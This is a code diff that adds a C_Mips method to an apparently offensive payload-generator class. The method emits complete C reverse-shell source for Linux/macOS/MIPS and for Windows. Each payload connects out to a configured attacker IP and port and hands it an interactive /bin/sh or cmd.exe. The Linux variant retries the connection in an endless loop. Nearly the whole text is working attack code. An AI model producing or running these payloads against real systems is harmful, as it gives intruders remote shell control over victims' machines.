@@ -233,6 +233,132 @@ class TemplateGenerator:
                                                                                                               str(Error))
 
         return self.__status
+    def C_Mips(self):
+        """
+            Description: This payload support GNU/Linux, Mac OSX and Mipsle
+        """
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and self.validate_parameter_type_reverse()['code'] == 200:
+
+            try:
+                self.__payload = f'''#include <sys/types.h>
+                                     #include <sys/socket.h>
+                                     #include <sys/wait.h>
+                                     #include <netinet/in.h>
+                                     #include <arpa/inet.h>
+                                     #include <errno.h>
+                                     #include <stdio.h>
+                                     #include <stdlib.h>
+                                     #include <string.h>
+                                     #include <unistd.h>
+                                    
+                                     int main(){{ 
+                                    
+                                         int socket_info;
+                                         int connectie;
+                                         int pid;
+                                         struct sockaddr_in aanvaller_info;
+                                    
+                                         while(1){{
+                                             socket_info = socket(AF_INET, SOCK_STREAM, 0);
+                                             aanvaller_info.sin_family = AF_INET;
+                                             aanvaller_info.sin_port = htons({self.__port});
+                                             aanvaller_info.sin_addr.s_addr = inet_addr("{self.__target}");
+                                             printf("Set data.\\n");
+                                            
+                                             printf("Trying to perform a new connection\\n");
+                                             connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
+                                             while(connectie < 0){{
+                                                 printf("Connection Failed\\n");
+                                                 sleep(5);
+                                                 connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
+                                             }}
+                                             connectie = write(socket_info,"Connection Completed\\n",36);
+                                            
+                                             printf("Successful Connection\\n");
+                                            
+                                             pid = fork();
+                                             if(pid > 0){{
+                                                 printf("Forking Process\\n");
+                                                 wait(NULL);
+                                             }}
+                                             if(pid == 0){{
+                                                 printf("Process Forked Successfully\\n");
+                                                 dup2(socket_info,0); // input
+                                                 dup2(socket_info,1); // output
+                                                 dup2(socket_info,2); // errors
+                                                 execl("/bin/sh", "/bin/sh", NULL);
+                                                 usleep(3000);
+                                             }}
+                                             printf("The connection was closed, trying to reconnect...\\n");
+                                         
+                                         }}
+                                     
+                                         return 0;
+                                     }}
+                                    '''
+
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        elif self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "#include <winsock2.h>\n" \
+                                 "#include <stdio.h>\n" \
+                                 "#pragma comment(lib,\"ws2_32\")\n" \
+                                 "\n" \
+                                 "WSADATA wsaData;\n" \
+                                 "SOCKET Winsock;\n" \
+                                 "struct sockaddr_in hax; \n" \
+                                 "char ip_addr[16] = \"" + self.__target + "\"; \n" \
+                                                                           "char port[6] = \"" + self.__port + "\";            \n" \
+                                                                                                               "\n" \
+                                                                                                               "STARTUPINFO ini_processo;\n" \
+                                                                                                               "\n" \
+                                                                                                               "PROCESS_INFORMATION processo_info;\n" \
+                                                                                                               "\n" \
+                                                                                                               "int main()\n" \
+                                                                                                               "{\n" \
+                                                                                                               "    WSAStartup(MAKEWORD(2, 2), &wsaData);\n" \
+                                                                                                               "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n" \
+                                                                                                               "\n" \
+                                                                                                               "\n" \
+                                                                                                               "    struct hostent *host; \n" \
+                                                                                                               "    host = gethostbyname(ip_addr);\n" \
+                                                                                                               "    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\n" \
+                                                                                                               "\n" \
+                                                                                                               "    hax.sin_family = AF_INET;\n" \
+                                                                                                               "    hax.sin_port = htons(atoi(port));\n" \
+                                                                                                               "    hax.sin_addr.s_addr = inet_addr(ip_addr);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    memset(&ini_processo, 0, sizeof(ini_processo));\n" \
+                                                                                                               "    ini_processo.cb = sizeof(ini_processo);\n" \
+                                                                                                               "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n" \
+                                                                                                               "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n" \
+                                                                                                               "\n" \
+                                                                                                               "    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n" \
+                                                                                                               "\n" \
+                                                                                                               "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    return 0;\n" \
+                                                                                                               "}\n"
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+
+        return self.__status
 
     def Dart(self):
         """
